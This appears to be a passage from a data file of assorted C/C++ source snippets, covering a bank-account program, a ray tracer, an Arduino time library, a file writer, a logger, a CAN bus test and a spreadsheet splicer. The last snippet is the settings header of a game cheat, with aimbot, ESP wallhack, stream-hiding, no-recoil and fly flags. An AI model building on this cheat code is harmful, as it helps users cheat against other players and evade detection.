false;\n    while (!infile.eof())\n    {\n        infile >> Account;\n        if (Account.acc_num == acc_no)\n        {\n            acc_found = true;\n            break;\n        }\n    }\n    if (acc_found == false)\n    {\n        cout << \"No account found. \\n Retry\";\n        goto retry;\n    }\n    int user_pin;\n    cout << \"Enter your pin to continue : \";\n    cin >> user_pin;\n    if (user_pin ==",
    "#include <fstream>\n#include \"Vector.hpp\"\n#include \"Renderer.hpp\"\n#include \"Scene.hpp\"\n#include <optional>\n\ninline float deg2rad(const float &deg)\n{ return deg * M_PI/180.0; }\n\n// Compute reflection direction\nVector3f reflect(const Vector3f &I, const Vector3f &N)\n{\n    return I - 2 * dotProduct(I, N) * N;\n}\n\n// [comment]\n// Compute refraction direction using Snell's law\n//\n// We need to handle with care the two possible situations:\n//\n//    - When the ray is inside the object\n//\n//    - When the ray is outside.\n//\n// If the ray is outside, you need to make cosi positive cosi = -N.I\n//\n// If the ray is inside, you need to invert the refractive indices and negate the normal N\n// [/comment]\nVector3f refract(const Vector3f &I, const Vector3f &N, const float &ior)\n{\n    float cosi = clamp(-1, 1, dotProduct(I, N));\n    float etai = 1, etat = ior;\n    Vector3f n = N;\n    if (cosi < 0) { cosi = -cosi; } else { std::swap(etai, etat); n= -N; }\n    float eta = etai / etat;\n    float k = 1 - eta * eta * (1 - cosi * cosi);\n    return k < 0 ? 0 : eta * I + (eta * cosi - sqrtf(k)) * n;\n}\n\n// [comment]\n// Compute Fresnel equation\n//\n// \\param I is the incident view direction\n//\n// \\param N is the normal at the intersection point\n//\n// \\param ior is the material refractive index\n// [/comment]\nfloat fresnel(const Vector3f &I, const Vector3f &N, const float &ior)\n{\n    float cosi = clamp(-1, 1, dotProduct(I, N));\n    float etai = 1, etat = ior;\n    if (cosi > 0) {  std::swap(etai, etat); }\n    // Compute sini using Snell's law\n    float sint = etai / etat * sqrtf(std::max(0.f, 1 - cosi * cosi));\n    // Total internal reflection\n    if (sint >= 1) {\n        return 1;\n    }\n    else {\n        float cost = sqrtf(std::max(0.f, 1 - sint * sint));\n        cosi = fabsf(cosi);\n        float Rs = ((etat * cosi) - (etai * cost)) / ((etat * cosi) + (etai * cost));\n        float Rp = ((etai * cosi) - (etat * cost)) / ((etai * cosi) + (etat * cost));\n        return (Rs * Rs + Rp * Rp) / 2;\n    }\n    // As a consequence of the conservation of energy, transmittance is given by:\n    // kt = 1 - kr;\n}\n\n// [comment]\n// Returns true if the ray intersects an object, false otherwise.\n//\n// \\param orig is the ray origin\n// \\param dir is the ray direction\n// \\param objects is the list of objects the scene contains\n// \\param[out] tNear contains the distance to the cloesest intersected object.\n// \\param[out] index stores the index of the intersect triangle if the interesected object is a mesh.\n// \\param[out] uv stores the u and v barycentric coordinates of the intersected point\n// \\param[out] *hitObject stores the pointer to the intersected object (used to retrieve material information, etc.)\n// \\param isShadowRay is it a shadow ray. We can return from the function sooner as soon as we have found a hit.\n// [/comment]\nstd::optional<hit_payload> trace(\n        const Vector3f &orig, const Vector3f &dir,\n        const std::vector<std::unique_ptr<Object> > &objects)\n{\n    float tNear = kInfinity;\n    std::optional<hit_payload> payload;\n    for (const auto & object : objects)\n    {\n        float tNearK = kInfinity;\n        uint32_t indexK;\n        Vector2f uvK;\n        if (object->intersect(orig, dir, tNearK, indexK, uvK) && tNearK < tNear)\n        {\n            payload.emplace();\n            payload->hit_obj = object.get();\n            payload->tNear = tNearK;\n            payload->index = indexK;\n            payload->uv = uvK;\n            tNear = tNearK;\n        }\n    }\n\n    return payload;\n}\n\n// [comment]\n// Implementation of the Whitted-style light transport algorithm (E [S*] (D|G) L)\n//\n// This function is the function that compute the color at the intersection point\n// of a ray defined by a position and a direction. Note that thus function is recursive (it calls itself).\n//\n// If the material of the intersected object is either reflective or reflective and refractive,\n// then we compute the reflection/refraction direction and cast two new rays into the scene\n// by calling the castRay() function recursively. When the surface is transparent, we mix\n// the reflection and refraction color using the result of the fresnel equations (it computes\n// the amount of reflection and refraction depending on the surface normal, incident view direction\n// and surface refractive index).\n//\n// If the surface is diffuse/glossy we use the Phong illumation model to compute the color\n// at the intersection point.\n// [/comment]\nVector3f castRay(\n        const Vector3f &orig, const Vector3f &dir, const Scene& scene,\n        int depth)\n{\n    if (depth > scene.maxDepth) {\n        return Vector3f(0.0,0.0,0.0);\n    }\n\n    Vector3f hitColor = scene.backgroundColor;\n    if (auto payload = trace(orig, dir, scene.get_objects()); payload)\n    {\n        Vector3f hitPoint = orig + dir * payload->tNear;\n        Vector3f N; // normal\n        Vector2f st; // st coordinates\n        payload->hit_obj->getSurfaceProperties(hitPoint, dir, payload->index, payload->uv, N, st);\n        switch (pay",
    "/*\n  time.c - low level time and date functions\n  Copyright (c) Michael Margolis 2009-2014\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n  \n  1.0  6  Jan 2010 - initial release\n  1.1  12 Feb 2010 - fixed leap year calculation error\n  1.2  1  Nov 2010 - fixed setTime bug (thanks to Korman for this)\n  1.3  24 Mar 2012 - many edits by Paul Stoffregen: fixed timeStatus() to update\n                     status, updated examples for Arduino 1.0, fixed ARM\n                     compatibility issues, added TimeArduinoDue and TimeTeensy3\n                     examples, add error checking and messages to RTC examples,\n                     add examples to DS1307RTC library.\n  1.4  5  Sep 2014 - compatibility with Arduino 1.5.7\n*/\n\n#if ARDUINO >= 100\n#include <Arduino.h> \n#else\n#include <WProgram.h> \n#endif\n\n#include \"TimeLib.h\"\n\nstatic tmElements_t tm;          // a cache of time elements\nstatic time_t cacheTime;   // the time the cache was updated\nstatic uint32_t syncInterval = 300;  // time sync will be attempted after this many seconds\n\nvoid refreshCache(time_t t) {\n  if (t != cacheTime) {\n    breakTime(t, tm); \n    cacheTime = t; \n  }\n}\n\nint hour() { // the hour now \n  return hour(now()); \n}\n\nint hour(time_t t) { // the hour for the given time\n  refreshCache(t);\n  return tm.Hour;  \n}\n\nint hourFormat12() { // the hour now in 12 hour format\n  return hourFormat12(now()); \n}\n\nint hourFormat12(time_t t) { // the hour for the given time in 12 hour format\n  refreshCache(t);\n  if( tm.Hour == 0 )\n    return 12; // 12 midnight\n  else if( tm.Hour  > 12)\n    return tm.Hour - 12 ;\n  else\n    return tm.Hour ;\n}\n\nuint8_t isAM() { // returns true if time now is AM\n  return !isPM(now()); \n}\n\nuint8_t isAM(time_t t) { // returns true if given time is AM\n  return !isPM(t);  \n}\n\nuint8_t isPM() { // returns true if PM\n  return isPM(now()); \n}\n\nuint8_t isPM(time_t t) { // returns true if PM\n  return (hour(t) >= 12); \n}\n\nint minute() {\n  return minute(now()); \n}\n\nint minute(time_t t) { // the minute for the given time\n  refreshCache(t);\n  return tm.Minute;  \n}\n\nint second() {\n  return second(now()); \n}\n\nint second(time_t t) {  // the second for the given time\n  refreshCache(t);\n  return tm.Second;\n}\n\nint day(){\n  return(day(now())); \n}\n\nint day(time_t t) { // the day for the given time (0-6)\n  refreshCache(t);\n  return tm.Day;\n}\n\nint weekday() {   // Sunday is day 1\n  return  weekday(now()); \n}\n\nint weekday(time_t t) {\n  refreshCache(t);\n  return tm.Wday;\n}\n   \nint month(){\n  return month(now()); \n}\n\nint month(time_t t) {  // the month for the given time\n  refreshCache(t);\n  return tm.Month;\n}\n\nint year() {  // as in Processing, the full four digit year: (2009, 2010 etc) \n  return year(now()); \n}\n\nint year(time_t t) { // the year for the given time\n  refreshCache(t);\n  return tmYearToCalendar(tm.Year);\n}\n\n/*============================================================================*/\t\n/* functions to convert to and from system time */\n/* These are for interfacing with time services and are not normally needed in a sketch */\n\n// leap year calculator expects year argument as years offset from 1970\n#define LEAP_YEAR(Y)     ( ((1970+(Y))>0) && !((1970+(Y))%4) && ( ((1970+(Y))%100) || !((1970+(Y))%400) ) )\n\nstatic  const uint8_t monthDays[]={31,28,31,30,31,30,31,31,30,31,30,31}; // API starts months from 1, this array starts from 0\n \nvoid breakTime(time_t timeInput, tmElements_t &tm){\n// break the given time_t into time components\n// this is a more compact version of the C library localtime function\n// note that year is offset from 1970 !!!\n\n  uint8_t year;\n  uint8_t month, monthLength;\n  uint32_t time;\n  unsigned long days;\n\n  time = (uint32_t)timeInput;\n  tm.Second = time % 60;\n  time /= 60; // now it is minutes\n  tm.Minute = time % 60;\n  time /= 60; // now it is hours\n  tm.Hour = time % 24;\n  time /= 24; // now it is days\n  tm.Wday = ((time + 4) % 7) + 1;  // Sunday is day 1 \n  \n  year = 0;  \n  days = 0;\n  while((unsigned)(days += (LEAP_YEAR(year) ? 366 : 365)) <= time) {\n    year++;\n  }\n  tm.Year = year; // year is offset from 1970 \n  \n  days -= LEAP_YEAR(year) ? 366 : 365;\n  time  -= days; // now it is days in this year, starting at 0\n  \n  days=0;\n  month=0;\n  monthLength=0;\n  for (month=0; month<12; month++) {\n    if (month==1) { // february\n      if (LEAP_YEAR(year)) {\n    ",
    "#include \"BufferBinaryWriter.hpp\"\n\n#include <unistd.h>\n#include <iostream>\n#include \"date.h\"\n#include <cerrno>\n#include <chrono>\n#include <cstring>\n#include <fcntl.h>\n\n#include \"BufferUtils.hpp\"\n\nusing namespace std;\n\nBufferBinaryWriter::BufferBinaryWriter(\n        const string& detector_folder,\n        const string& module_name):\n        detector_folder_(detector_folder),\n        module_name_(module_name),\n        latest_filename_(detector_folder + \"/\" + module_name + \"/LATEST\"),\n        current_output_filename_(\"\"),\n        output_file_fd_(-1)\n{\n}\n\nBufferBinaryWriter::~BufferBinaryWriter()\n{\n    close_current_file();\n}\n\nvoid BufferBinaryWriter::write(\n        const uint64_t pulse_id,\n        const BufferBinaryFormat* buffer)\n{\n    auto current_frame_file =\n            BufferUtils::get_filename(detector_folder_, module_name_, pulse_id);\n\n    if (current_frame_file != current_output_filename_) {\n        open_file(current_frame_file);\n    }\n\n    size_t n_bytes_offset =\n            BufferUtils::get_file_frame_index(pulse_id) *\n            sizeof(BufferBinaryFormat);\n\n    auto lseek_result = lseek(output_file_fd_, n_bytes_offset, SEEK_SET);\n    if (lseek_result < 0) {\n        stringstream err_msg;\n\n        using namespace date;\n        using namespace chrono;\n        err_msg << \"[\" << system_clock::now() << \"]\";\n        err_msg << \"[BufferBinaryWriter::write]\";\n        err_msg << \" Error while lseek on file \";\n        err_msg << current_output_filename_;\n        err_msg << \" for n_bytes_offset \";\n        err_msg << n_bytes_offset << \": \";\n        err_msg << strerror(errno) << endl;\n\n        throw runtime_error(err_msg.str());\n    }\n\n    auto n_bytes = ::write(output_file_fd_, buffer, sizeof(BufferBinaryFormat));\n    if (n_bytes < sizeof(BufferBinaryFormat)) {\n        stringstream err_msg;\n\n        using namespace date;\n        using namespace chrono;\n        err_msg << \"[\" << system_clock::now() << \"]\";\n        err_msg << \"[BufferBinaryWriter::write]\";\n        err_msg << \" Error while writing to file \";\n        err_msg << current_output_filename_ << \": \";\n        err_msg << strerror(errno) << endl;\n\n        throw runtime_error(err_msg.str());\n    }\n}\n\nvoid BufferBinaryWriter::open_file(const std::string& filename)\n{\n    close_current_file();\n\n    BufferUtils::create_destination_folder(filename);\n\n    output_file_fd_ = ::open(filename.c_str(), O_WRONLY | O_CREAT,\n                             S_IRWXU | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);\n    if (output_file_fd_ < 0) {\n        stringstream err_msg;\n\n        using namespace date;\n        using namespace chrono;\n        err_msg << \"[\" << system_clock::now() << \"]\";\n        err_msg << \"[BinaryWriter::open_file]\";\n        err_msg << \" Cannot create file \";\n        err_msg << filename << \": \";\n        err_msg << strerror(errno) << endl;\n\n        throw runtime_error(err_msg.str());\n    }\n\n    // TODO: Remove context if test successful.\n\n    /** Setting the buffer file size in advance to try to lower the number of\n        metadata updates on GPFS. */\n    {\n        // TODO: Try instead to use fallocate.\n        if (lseek(output_file_fd_, MAX_FILE_BYTES, SEEK_SET) < 0) {\n            stringstream err_msg;\n\n            using namespace date;\n            using namespace chrono;\n            err_msg << \"[\" << system_clock::now() << \"]\";\n            err_msg << \"[BufferBinaryWriter::open_file]\";\n            err_msg << \" Error while lseek on end of file \";\n            err_msg << current_output_filename_;\n            err_msg << \" for MAX_FILE_BYTES \";\n            err_msg << MAX_FILE_BYTES << \": \";\n            err_msg << strerror(errno) << endl;\n\n            throw runtime_error(err_msg.str());\n        }\n\n        const uint8_t mark = 255;\n        if(::write(output_file_fd_, &mark, sizeof(mark)) != sizeof(mark)) {\n            stringstream err_msg;\n\n            using namespace date;\n            using namespace chrono;\n            err_msg << \"[\" << system_clock::now() << \"]\";\n            err_msg << \"[BufferBinaryWriter::open_file]\";\n            err_msg << \" Error while writing to file \";\n            err_msg << current_output_filename_ << \": \";\n            err_msg << strerror(errno) << endl;\n\n            throw runtime_error(err_msg.str());\n        }\n    }\n\n\n    current_output_filename_ = filename;\n}\n\nvoid BufferBinaryWriter::close_current_file()\n{\n    if (output_file_fd_ != -1) {\n        if (close(output_file_fd_) < 0) {\n            stringstream err_msg;\n\n            using namespace date;\n            using namespace chrono;\n            err_msg << \"[\" << system_clock::now() << \"]\";\n            err_msg << \"[BufferBinaryWriter::close_current_file]\";\n            err_msg << \" Error while closing file \";\n            err_msg << current_output_filename_ << \": \";\n            err_msg << strerror(errno) << endl;\n\n            throw runtime_error(err_msg.str());\n        }\n\n        output_file_fd_ = -1;\n\n        BufferUtils::update_latest_file(\n                latest_filename_, current_output_file",
    "#include \"Student.h\"\n\nStudent::Student (const Student& unit) {\n    this->number = unit.number;\n    this->first_name = unit.first_name;\n    this->middle_name = unit.middle_name;\n    this->last_name = unit.last_name;\n    this->year = unit.year;\n    this->birthday = unit.birthday;\n    this->faculty = unit.faculty;\n    this->department = unit.department;\n    this->group = unit.group;\n    this->gender = unit.gender;\n    this->sessions = unit.sessions;\n}\n\nStudent::Student (const std::string number, const std::string first_name, const std::string middle_name, const std::string last_name, const unsigned short year, const std::string birthday, const std::string faculty, const std::string department, const std::string group, const std::string gender, const List <grade> grades) {\n    this->number = number;\n    this->first_name = first_name;\n    this->middle_name = middle_name;\n    this->last_name = last_name;\n    this->year = year;\n    this->birthday = birthday;\n    this->faculty = faculty;\n    this->department = department;\n    this->group = group;\n    this->gender = gender;\n    this->sessions = sessions;\n}\n\nStudent& Student::operator= (const Student& unit) {\n    this->number = unit.number;\n    this->first_name = unit.first_name;\n    this->middle_name = unit.middle_name;\n    this->last_name = unit.last_name;\n    this->year = unit.year;\n    this->birthday = unit.birthday;\n    this->faculty = unit.faculty;\n    this->department = unit.department;\n    this->group = unit.group;\n    this->gender = unit.gender;\n    this->sessions = unit.sessions;\n    return *this;\n}\n\nbool Student::operator== (const Student& unit1) const {\n    return (this->number == unit1.getNumber());\n}\n",
    "#include \"CANBUS_.h\"\n\n//unsigned long t_canbus = 0;\n\n/*\nvoid TEST_canbus()\n{\n\n    //      SETUP\n\n    // start the CAN bus at 500 kbps\n    if (!CAN.begin(500E3))\n    {\n        Serial.println(\"Starting CAN failed!\");\n        while (1)\n            ;\n    }\n\n    CAN.loopback();\n\n    //  -----------------------------------------------------------------------------------------------------------------------\n\n    while (1)\n    {\n\n        //      READ PACKET\n\n        // try to parse packet\n        int packetSize = CAN.parsePacket();\n\n        if (packetSize)\n        {\n            // received a packet\n            Serial.print(\"Received \");\n\n            if (CAN.packetExtended())\n            {\n                Serial.print(\"extended \");\n            }\n\n            if (CAN.packetRtr())\n            {\n                // Remote transmission request, packet contains no data\n                Serial.print(\"RTR \");\n            }\n\n            Serial.print(\"packet with id 0x\");\n            Serial.print(CAN.packetId(), HEX);\n\n            if (CAN.packetRtr())\n            {\n                Serial.print(\" and requested length \");\n                Serial.println(CAN.packetDlc());\n            }\n            else\n            {\n                Serial.print(\" and length \");\n                Serial.println(packetSize);\n\n                // only print packet data for non-RTR packets\n                while (CAN.available())\n                {\n                    Serial.print((char)CAN.read());\n                }\n                Serial.println();\n            }\n\n            Serial.println();\n        }\n\n        //  -----------------------------------------------------------------------------------------------------------------------\n\n        //      SEND PACKET\n\n        if ((millis() - t_canbus) > 1000)\n        {\n            // send packet: id is 11 bits, packet can contain up to 8 bytes of data\n            Serial.print(\"Sending packet ... \");\n\n            CAN.beginPacket(0x12);\n            CAN.write('h');\n            CAN.write('e');\n            CAN.write('l');\n            CAN.write('l');\n            CAN.write('o');\n            CAN.endPacket();\n\n            Serial.println(\"done\");\n            Serial.println();\n\n            t_canbus = millis();\n        }\n\n        delay(10);\n    }\n}\n*/\n\nvoid TEST_canbus() {\n    Serial.println();\n    Serial.println(\"TEST CANBUS\");\n    Serial.println();\n\n    unsigned long t_canbus = 0;\n    bool success = false;\n\n    //      SETUP\n    // start the CAN bus at 500 kbps\n    if (!CAN.begin(500E3)) {\n        Serial.println(\"Starting CAN failed!\");\n        Serial.println(\"---> TEST ERROR <---\");\n        Serial.println(\"{ \\\"name\\\": \\\"Canbus\\\", \\\"result\\\": \\\"error\\\"}\");\n        Serial.println();\n        Serial.println(\"FINE TEST CANBUS\");\n        Serial.println();\n        return;\n    }\n\n    CAN.loopback();\n\n    //  -----------------------------------------------------------------------------------------------------------------------\n\n    String messaggio = \"\";\n\n    unsigned long t_timeout = millis();\n    while (!success && ((millis() - t_timeout) < 10000)) {\n\n        //      READ PACKET\n        // try to parse packet\n        int packetSize = CAN.parsePacket();\n\n        if (packetSize) {\n            if (CAN.packetId() == 119) {\n\n                while (CAN.available())\n                {\n                    messaggio += (char)CAN.read();\n                }\n\n                if (messaggio == \"hello\") {\n                    Serial.println(\"messaggio ricevuto\");\n                    Serial.println();\n                    success = 1;\n                }\n            }\n        }\n\n        //  -----------------------------------------------------------------------------------------------------------------------\n\n        //      SEND PACKET\n        if ((millis() - t_canbus) > 1000) {\n            // send packet: id is 11 bits, packet can contain up to 8 bytes of data\n\n            CAN.beginPacket(0x77);\n            CAN.write('h');\n            CAN.write('e');\n            CAN.write('l');\n            CAN.write('l');\n            CAN.write('o');\n            CAN.endPacket();\n\n            Serial.println(\"messaggio inviato\");\n            Serial.println();\n\n            t_canbus = millis();\n        }\n        \n        delay(10);\n    }\n\n    if (success) {\n        Serial.println(\"---> TEST OK <---\");\n        Serial.println(\"{ \\\"name\\\": \\\"Canbus\\\", \\\"result\\\": \\\"ok\\\"}\");\n    } else {\n        Serial.println(\"---> TEST ERROR <---\");\n        Serial.println(\"{ \\\"name\\\": \\\"Canbus\\\", \\\"result\\\": \\\"error\\\"}\");\n    }\n\n    Serial.println();\n    Serial.println(\"FINE TEST CANBUS\");\n    Serial.println();\n}\n",
    "#include \"log.hpp\"\n#include \"blockqueue.hpp\"\n#include <cstdarg>\n#include <cstdio>\n#include <ctime>\n#include <memory>\n#include <mutex>\n#include <sys/stat.h>\n#include <sys/time.h>\n#include <thread>\n#include <utility>\n\nLog::Log()\n    : _lineCount(0), _isAsync(false), _writeThread(nullptr), _deque(nullptr),\n      _today(0), _fp(nullptr)\n{\n}\n\nLog::~Log()\n{\n    if (_writeThread && _writeThread->joinable()) {\n        while (!_deque->empty()) {\n            _deque->flush();\n        }\n        _deque->close();\n        _writeThread->join();\n    }\n    if (_fp) {\n        lock_guard<mutex> locker(_mtx);\n        flush();\n        fclose(_fp);\n    }\n}\n\nint Log::getLevel()\n{\n    lock_guard<mutex> lock(_mtx);\n    return _level;\n}\n\nvoid Log::setLevel(int level)\n{\n    lock_guard<mutex> lock(_mtx);\n    _level = level;\n}\n\nvoid Log::init(int level = 1, const char* path, const char* suffix,\n               int maxQueueSize)\n{\n    _isOpen = true;\n    _level = level;\n    if (maxQueueSize > 0) {\n        _isAsync = true; // \u5f00\u542f\u5f02\u6b65\u5199\u5165\u6a21\u5f0f\uff0c\u4f7f\u7528blockDeque\u961f\u5217\n        if (!_deque) {   // \u76ee\u524d\u961f\u5217\u4e3a\u7a7a\n            unique_ptr<blockDeque<string> > newDeque(\n                new blockDeque<string>(maxQueueSize));\n            _deque = move(newDeque);\n\n            unique_ptr<thread> newThread(new thread(flushLogThread));\n            _writeThread = move(newThread);\n        }\n    } else {\n        _isAsync = false;\n    }\n\n    _lineCount = 0;\n\n    time_t timer = time(nullptr);\n    struct tm* sysTime = localtime(&timer);\n    struct tm t = *sysTime;\n    _path = path;\n    _suffix = suffix;\n    char fileName[LOG_NAME_LEN] = {0};\n    snprintf(fileName, LOG_NAME_LEN - 1, \"%s/%04d_%02d_%02d%s\", _path,\n             t.tm_year + 1900, t.tm_mon + 1, t.tm_mday, _suffix);\n    _today = t.tm_mday;\n\n    {\n        lock_guard<mutex> locker(_mtx);\n        _buffer.retrieveAll(); // \u6e05\u7a7a\u7f13\u51b2\u533a\n        if (_fp) {\n            flush();\n            fclose(_fp);\n        }\n\n        _fp = fopen(fileName, \"a\");\n        if (_fp == nullptr) {\n            mkdir(_path, 0777);\n            _fp = fopen(fileName, \"a\");\n        }\n        assert(_fp != nullptr);\n    }\n}\n\nvoid Log::write(int level, const char* format, ...)\n{\n    struct timeval now = {0, 0};\n    gettimeofday(&now, nullptr);\n    time_t tSec = now.tv_sec;\n    struct tm* systime = localtime(&tSec);\n    struct tm t = *systime;\n    va_list vaList;\n\n\n    //\u5982\u679c\u5f53\u524d\u65e5\u671f\u4e0e _today \u4e0d\u540c\uff08\u8de8\u5929\u4e86\uff09\uff0c\u6216\u8005(_lineConut \u4e0d\u4e3a\u96f6\u5e76\u4e14 _lineConut \u662f MAX_LINES \u7684\u6574\u6570\u500d\uff08\u5199\u5165\u4e86\u8db3\u591f\u591a\u7684\u65e5\u5fd7\u884c\uff09\n    if (_today != t.tm_mday || (_lineCount && (_lineCount % MAX_LINES == 0))) {\n        unique_lock<mutex> locker(_mtx);\n        locker.unlock();\n\n        char newFile[LOG_NAME_LEN];\n        char tail[36] = {0};\n        snprintf(tail, 36, \"%04d_%02d_%02d\", t.tm_year + 1900, t.tm_mon + 1,\n                 t.tm_mday);\n\n        if (_today != t.tm_mday) {\n            snprintf(newFile, LOG_NAME_LEN - 72, \"%s/%s%s\", _path, tail,\n                     _suffix);\n            _today = t.tm_mday;\n            _lineCount = 0;\n        } else {\n            snprintf(newFile, LOG_NAME_LEN - 72, \"%s/%s-%d%s\", _path, tail,\n                     (_lineCount / MAX_LINES), _suffix);\n        }\n\n        locker.lock();\n        flush();\n        fclose(_fp);\n        _fp = fopen(newFile, \"a\");\n        assert(_fp != nullptr);\n    }\n\n    {\n        unique_lock<mutex> locker(_mtx);\n        _lineCount++;\n        int n = snprintf(_buffer.beginWrite(), 128,\n                         \"%d-%02d-%02d %02d:%02d:%02d.%06ld \", t.tm_year + 1900,\n                         t.tm_mon + 1, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec,\n                         now.tv_usec);\n        _buffer.hasWritten(n);\n        _appendLogLevelTitle(level);\n\n        va_start(vaList, format);\n        int m = vsnprintf(_buffer.beginWrite(), _buffer.writableBytes(), format,\n                          vaList);\n        va_end(vaList);\n\n        _buffer.hasWritten(m);\n        _buffer.append(\"\\n\\0\", 2);\n\n        if (_isAsync && _deque && !_deque->full()) {\n            _deque->push_back(_buffer.retrieveAllToStr());\n        } else {\n            fputs(_buffer.peek(), _fp);\n        }\n        _buffer.retrieveAll();\n    }\n}\n\nvoid Log::_appendLogLevelTitle(int level)\n{\n    switch (level) {\n        case 0:\n            _buffer.append(\"[debug]: \", 9);\n            break;\n        case 1:\n            _buffer.append(\"[info] : \", 9);\n            break;\n        case 2:\n            _buffer.append(\"[warn] : \", 9);\n            break;\n        case 3:\n            _buffer.append(\"[error]: \", 9);\n            break;\n        default:\n            _buffer.append(\"[info] : \", 9);\n            break;\n    }\n}\n\nvoid Log::flush()\n{\n    if (_isAsync) {\n        // \u901a\u77e5\u6d88\u8d39\u8005\u53ef\u4ee5\u53d6\u51fastring\u8fdb\u884c\u5199\u5165\u4e86\n        _deque->flush();\n    }\n    fflush(_fp);\n}\n\nvoid Log::_asyncWrite()\n{\n    string str = \"\";\n    while (_deque->pop(str)) {\n        lock_guard<mutex> locker(_mtx);\n        fputs(str.c_str(), _fp);\n    }\n}\n\nLog* Log::getInstance()\n{\n    static Log instance;\n    return &instance;\n}\n\nvoid Log::flushLogThread()\n{\n    Log::getInstance()->_asyncWrite();\n}",
    "#include \"splice.h\"\n\n[[cpp11::register]]\nstd::string splice_sheet_(const std::string original_xml, const std::string sheet_file, const bool flat) {\n    rapidxml::xml_document<> spreadsheet1;\n    // read the content in heap\n    rapidxml::file<> *xml_file = new rapidxml::file<>(original_xml.c_str());\n    spreadsheet1.parse<0>((char*)xml_file->data());\n    rapidxml::xml_node<>* root_node;\n    if (!flat) {\n        root_node = spreadsheet1.first_node()->first_node(\"office:body\")->\n            first_node(\"office:spreadsheet\");\n    } else {\n        root_node = spreadsheet1.first_node(\"office:document\")->first_node(\"office:body\")->\n            first_node(\"office:spreadsheet\");\n    }\n    rapidxml::xml_document<> spreadsheet2;\n    rapidxml::file<> *xml_file2 = new rapidxml::file<>(sheet_file.c_str());\n    spreadsheet2.parse<0>((char*)xml_file2->data());\n    rapidxml::xml_node<> *root_node2;\n    root_node2 = spreadsheet2.first_node(\"table:table\");\n    rapidxml::xml_node<> *new_node = spreadsheet2.clone_node(root_node2);\n    root_node->append_node(new_node);\n    std::ofstream output_file(original_xml);\n    output_file << \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\";\n    output_file << spreadsheet1;\n    output_file.close();\n    delete xml_file;\n    delete xml_file2;\n    return original_xml;\n}\n\n[[cpp11::register]]\nstd::string update_sheet_(const std::string original_xml, const std::string sheet_file, const bool flat, const int sheet_index) {\n    rapidxml::xml_document<> spreadsheet1;\n    rapidxml::file<> *xml_file = new rapidxml::file<>(original_xml.c_str());\n    spreadsheet1.parse<0>((char*)xml_file->data());\n    rapidxml::xml_node<>* root_node;\n    rapidxml::xml_node<>* parent_node;\n\n    if (!flat) {\n        root_node = spreadsheet1.first_node()->first_node(\"office:body\")->\n            first_node(\"office:spreadsheet\")->first_node(\"table:table\");\n        parent_node = spreadsheet1.first_node()->first_node(\"office:body\")->\n            first_node(\"office:spreadsheet\");\n\n    } else {\n        root_node = spreadsheet1.first_node(\"office:document\")->first_node(\"office:body\")->\n            first_node(\"office:spreadsheet\")->first_node(\"table:table\");\n        parent_node = spreadsheet1.first_node(\"office:document\")->first_node(\"office:body\")->\n            first_node(\"office:spreadsheet\");\n    }\n    for (int i = 1; i < sheet_index; i++){\n        root_node = root_node->next_sibling(\"table:table\");\n    }\n\n    rapidxml::xml_document<> spreadsheet2;\n    rapidxml::file<> *xml_file2 = new rapidxml::file<>(sheet_file.c_str());\n    spreadsheet2.parse<0>((char*)xml_file2->data());\n    rapidxml::xml_node<> *root_node2;\n    root_node2 = spreadsheet2.first_node(\"table:table\");\n    rapidxml::xml_node<> *new_node = spreadsheet2.clone_node(root_node2);\n    parent_node->insert_node(root_node, new_node);\n    parent_node->remove_node(root_node);\n    std::ofstream output_file(original_xml);\n    output_file << \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\";\n    output_file << spreadsheet1;\n    output_file.close();\n    delete xml_file;\n    delete xml_file2;\n    return original_xml;\n}\n",
    "#include \"config.h\"\r\n\r\n// DYNAMIC FOV\r\nbool dynamicEsp = true;\r\nfloat decreaseStep = 0.1f;\r\nbool isButtonPressed = false;\r\nint steps = 300;\r\n\r\n// AIM\r\nbool Aimbot = false;\r\nbool fovcircle = false;\r\nbool humanAim = false;\r\n\r\n// ESP\r\nbool lobby = false;\r\nbool Esp = false;\r\nbool slefESP = false;\r\nbool BoxEsp = false;\r\nbool CorneredBoxEsp = false;\r\nbool FilledBoxEsp = false;\r\nbool DistanceEsp = false;\r\nbool SkeletonEsp = false;\r\nbool bigDickEsp = false;\r\nbool tinyDickEsp = false;\r\nbool CrosshairLines = false;\r\nbool ClosestSnaplines = false;\r\nbool VisibleCheck = false;\r\nfloat NotVisColor[3] = { 0.0f, 1.0f, 1.0f }; // Cyan color\r\nfloat VisColor[3] = { 1.0f, 0.58f, 0.0f };   // Orange color\r\nfloat EspThickness = 2.5f;\r\nbool headCircleEsp = false;\r\nbool reloadEsp = false;\r\nbool weaponEsp = false;\r\nbool outlinedBoxEsp = true;\r\nbool nameEsp = false;\r\n\r\n// MISC\r\nbool ShowMenu = true;\r\nbool particles = false;\r\nbool StreamProof = false;\r\nbool Crosshair = false;\r\nbool showFps = true;\r\n\r\n// EXPLOITS\r\nbool carFly = false;\r\nbool noRecoil = false;\r\nbool bigPlayer = false;\r\nbool playerFly = false;\r\n\r\n// ADDITIONAL VARIABLES\r\nfloat BoxWidthValue = 0.550;\r\nfloat ChangerFOV = 80;\r\nint aimkeypos = 3;\r\nint aimbone = 1;\r\nfloat smooth = 5.0f;\r\nint VisDist = 500;\r\nfloat AimFOV = 150;\r\nint aimkey;\r\nint hitbox;\r\nint hitboxpos = 0;\r\nfloat CrossHair[3];\r\nfloat CrossThickness = 1.5f;",
